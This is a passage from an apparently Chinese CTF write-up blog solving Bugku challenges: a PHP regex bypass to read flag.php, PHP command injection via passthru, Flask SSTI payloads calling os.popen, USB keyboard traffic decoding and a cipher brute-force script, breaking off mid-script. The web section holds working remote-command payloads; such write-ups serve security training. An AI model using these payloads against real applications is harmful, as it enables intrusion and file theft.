<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$zero=$_REQUEST[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line">$first=$_REQUEST[<span class="string">&#x27;first&#x27;</span>];</span><br><span class="line">$second=$zero.$first;</span><br><span class="line"><span class="keyword">if</span>(preg_match_all(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,$second))&#123;</span><br><span class="line">    $key=$second;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\.\.|flag/&quot;</span>,$key))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $third=$first;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,$third))&#123;</span><br><span class="line">            $end=substr($third,<span class="number">5</span>);</span><br><span class="line">            highlight_file(base64_decode($zero).$end);<span class="comment">//maybe flag in flag.php</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
<p>首先接收<code>zero</code>和<code>first</code>参数，第一个if需要对两个参数内容的拼接结果进行匹配，第二个if需要对<code>first</code>进行匹配<br>
最后是一个文件显示，并且提示flag在flag.php，而flag.php经过base64编码后为<code>ZmxhZy5waHA=</code>，其中包含a，过了第一个正则<br>
接下来看第二个正则匹配，按理说这里的正则内容应该是匹配<code>\</code>或者<code>.php</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/No%20one%20knows%20regex%20better%20than%20me/01%5DLS5CSW%29FR1D6%28R%249%7D8JJ.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/No%20one%20knows%20regex%20better%20than%20me/%5B5A90LBMULJ4F1%40W%608M3F1T.png" alt=""><br>
这里有个小坑点，让我耗了点时间，与一血失之交臂😢；这里因为php解释器的问题，第一个<code>\</code>把第二个<code>\</code>实义了之后，接着第二个<code>\</code>又转义了<code>|</code>，结果<code>|</code>变成了字符串的一部分<br>
所以paylaod为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?zero&#x3D;ZmxhZy5waHA&amp;first&#x3D;|.php</span><br></pre></td></tr></table></figure>
<h3 id="聪明的php"><a class="header-anchor" href="#聪明的php">¶</a>聪明的php</h3>
<p>打开页面，提示我们传入参数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/V%7DA%7DJ%5D%256%24WOT%7BJQ%29%7BY%29C2%28Q.png" alt=""><br>
我们随便传个a试试<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/7V%2842VMA9_99B5%5DB%29Z0GK30.png" alt=""><br>
回显出代码，这里ban了flag字符串，还ban掉一些命令执行函数，我们试试能不能回显出phpinfo<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/8WDXG9UE307%29LUL4_10%7D~%7DG.png" alt=""><br>
发现可行，我们使用<code>passthru()</code>函数来配合执行命令<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/1U1H3H3O7_3S4FUDR%5B6T%25X4.png" alt=""><br>
发现可疑的文件<code>_16634</code>，读取一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/%5DE9MV%28NK%5B~%60%29_SKC5SHG3CC.png" alt=""><br>
得到flag，最终paylaod为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;$&#123;passthru(&quot;tac ..&#x2F;..&#x2F;..&#x2F;_16634&quot;)&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Simple-SSTI-1"><a class="header-anchor" href="#Simple-SSTI-1">¶</a>Simple_SSTI_1</h3>
<p>从题目上来看就知道是ssti模板注入，并且提示传参flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Simple_SSTI_1/%5B%7B42M5~I%40%7DR2402%24CSLHN%28A.png" alt=""><br>
用<code>&#123;&#123;config&#125;&#125;</code>查看配置信息一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Simple_SSTI_1/%5B%5B0%25U9R_AU1MG%5B4N%5DUT9UOX.png" alt=""><br>
直接看到了flag</p>
<h3 id="Simple-SSTI-2"><a class="header-anchor" href="#Simple-SSTI-2">¶</a>Simple_SSTI_2</h3>
<p>这次不再配置信息中，我们利用os中的popen来执行我们的命令，用ls来查看当前目录<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/ssti2/O1G%5D4NUNR%7BKAO%7D94RW9%5DE%7DU.png" alt=""><br>
发现flag，直接cat读取即可，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?flag&#x3D;&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/ssti2/9%24X63%5DKZR%609E5NJI9W_P~KN.png" alt=""></p>
<h3 id="Flask-FileUpload"><a class="header-anchor" href="#Flask-FileUpload">¶</a>Flask_FileUpload</h3>
<p>打开题目，看见是个文件上传<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/SZ_UH%28PZPP%7DWXSM1%60HA1JMR.png" alt=""><br>
右键源码有提示，告诉我们文件会被当做python代码执行<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/1Z%24IVF%28AN%7BH%5B_N6_%5B%606NR%5DL.png" alt=""><br>
我们新建一个txt，然后写入paylaod，后缀改成png上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls ..&#x2F;&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/YDO%7BW0%40FWN%5DU%40O%5DW2ACBL%406.png" alt=""><br>
发现了flag，再改成cat读取flag即可，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat ..&#x2F;flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/R%257ON161_%7BE%7DBP%5D%242F9%24G%29S.png" alt=""></p>
<h2 id="Misc"><a class="header-anchor" href="#Misc">¶</a>Misc</h2>
<h3 id="花点流量听听歌"><a class="header-anchor" href="#花点流量听听歌">¶</a>花点流量听听歌</h3>
<p>首先下载文件是一个压缩包，解压出来是一个音频文件，于是直接丢到au中查看一下，查看频谱图<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/D2F%25%28%295~4%29CD_G96L%60E%5BH9H.png" alt=""><br>
得知会有一个beaufort-cipher加密，那我们继续前进，再把音频文件放进010中查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/LVB5TU62~%7DD_H%24%29AUXOKZFD.png" alt=""><br>
发现文件尾部有一个504b0304的十六进制开头，这是zip文件的文件头，于是我们在010中新建一个16进制文件，把从504b0304开始的后面所有数据复制过来到新文件中，再保存为new.zip<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/Y%25%5BD0R2T%40F%29S5CU1GOGR9%5BC.png" alt=""><br>
同时再文件底部发现还有一串字符串，发现是密文<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/J8ZXQDN%40G9EF%5DW%5BA~HX%7BL_T.png" alt=""><br>
于是我们接下来要找解开密文的key，解压我们刚刚刚保存的new.zip，得到这些文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/Z%24O2AESR%5DW52XY6JSH0%24B%5DM.png" alt=""><br>
打开流量包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/6303OL0%5BT%25%40XD%5D%7D%40FHDU%29EL.png" alt=""><br>
发现全是usb的流量，那我们去kali导出一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r whereiskey.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/ZI%28%604I%29SK1%29AQ%284SP%28OR%2446.png" alt=""></p>
<blockquote>
<p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usb packet，这里两位为一个字节，一共8个字节明显是键盘数据包</p>
</blockquote>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VIS%5DLTNAT%24SQYS0F6~DDM%5BD.png" alt=""><br>
使用脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> len(line)!=<span class="number">17</span>: <span class="comment">#首先过滤掉鼠标等其他设备的USB流量</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>]) <span class="comment">#取一、三字节</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&quot;02&quot;</span>: <span class="comment">#表示按下了shift</span></span><br><span class="line">            output += shiftKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            output += normalKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line">print(<span class="string">&#x27;output :n&#x27;</span> + output)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/FJ%5D%5DSIP820Z38BUQ%24OKKU%60H.png" alt=""><br>
于是进行分析<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/%5B_%605WJHV1%6091LCHFTES1C_G.png" alt=""><br>
回头再看看，有一个描述.txt，在这里发现一段文字<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/WO%29V3VDRL0F%24N%40ES2C%5D%7BPSA.png" alt=""><br>
意思是被删除的才是重要的，也就是被del的才是key<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/7J_%28IGI913~XQX3BPW%5B%24~ZJ.png" alt=""><br>
于是去解密一下，网址链接：<code>https://www.dcode.fr/beaufort-cipher</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VW22RQQV%28E%246LMS%5BJPP%25H42.png" alt=""><br>
得到压缩包密码为：happyeveryday，打开压缩包，得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VFAE%28U0%24~EF%25%7D~%29OH~JQ~_3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bugku&#123;What_a_enjoyable_music&#125;</span><br></pre></td></tr></table></figure>
<h3 id="抄错的字符"><a class="header-anchor" href="#抄错的字符">¶</a>抄错的字符</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目：</span><br><span class="line">老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW</span><br></pre></td></tr></table></figure>
<p>根据提示，有些数字被替换成了字母，然后所有字母都被替换成了大写字母，密文是：QWIHBLGZZXJSXZNVBZW</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">看了一下密文，被认错的字母大概率是Z-2,S-5,B-8,G-9,I-1这些</span><br></pre></td></tr></table></figure>
<p>一开始我是手撸出来的，分段解其实挺快的，我用了半个小时左右，方法就是每4个为一位进行解密，这里先放当时手解的图片<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6/%24%5D%28%60Y1L%7B2O%40U4AVI%4082OT%40D.png" alt=""><br>
后来和另一位师傅沟通想写个多线程爆破的，但没写成功哈哈(太菜了)，这里贴一下无脑爆破的脚本吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-02-12 18:16:06</span></span><br><span class="line"><span class="string">blog: www.wlhhlc.top</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getallerrorPossible</span>(<span class="params">S, e</span>):</span></span><br><span class="line">    err = e</span><br><span class="line">    r = [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> err:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(r)):</span><br><span class="line">                r[i] += s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(r)):</span><br><span class="line">                tmp = r[i]</span><br><span class="line">                <span class="keyword">if</span> s == <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">letterCasePermutation</span>(<span class="params">S</span>):</span></span><br><span class="line">    res = [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s.isalpha():</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                res[i] += s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                tmp = res[i]</span><br><span class="line">                res[i] += s.lower()</span><br><span class="line">                res.append(tmp + s.upper())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_fun</span>(<span class="params">list, delete_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span 